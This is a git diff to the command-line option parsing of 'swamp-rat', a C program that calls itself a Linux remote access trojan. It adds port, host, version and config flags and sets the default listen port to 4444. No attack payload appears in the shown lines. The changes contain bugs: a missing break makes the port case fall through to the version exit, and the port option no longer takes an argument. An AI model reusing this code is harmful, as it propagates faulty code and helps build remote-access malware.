@@ -27,11 +27,13 @@ const char *program_bug_address = "lillypadgirl86@gmail.com";
 
 static char program_doc[] = "swamp-rat --- A Linux Rat in C";
 
-static char program_args_doc[] = "asdf asdf";
+static char program_args_doc[] = "-p 4444";
 
 static struct argp_option program_options[] = {
-  {"help", 'h', 0, 0, "help menu"},
-  {"port", 'p', "ARG", 0,  "listen port"},
+  {"port", 'p', 0, 0,  "listen / config port"},
+  {"host", 'h', 0, 0, "config host"},
+  {"version", 'v', 0, 0, "display version"},
+  {"config", 'c', 0, 0, "write config"},
   { 0 }
 };
 
@@ -47,13 +49,21 @@ static error_t parse_opt(int key,
   switch(key){
   case 'p':
     arguments->port = atoi(arg);
+  case 'v':
+    printf("%s\n", program_version);
+    exit(EXIT_SUCCESS);
   default:
     return ARGP_ERR_UNKNOWN;
   }
   return 0;
 }
 
-static struct argp argp = {program_options, parse_opt, program_args_doc, program_doc};
+static struct argp argp = {
+  program_options,
+  parse_opt,
+  program_args_doc,
+  program_doc
+};
 
 int main(int argc, char **argv){
   struct arguments arguments;
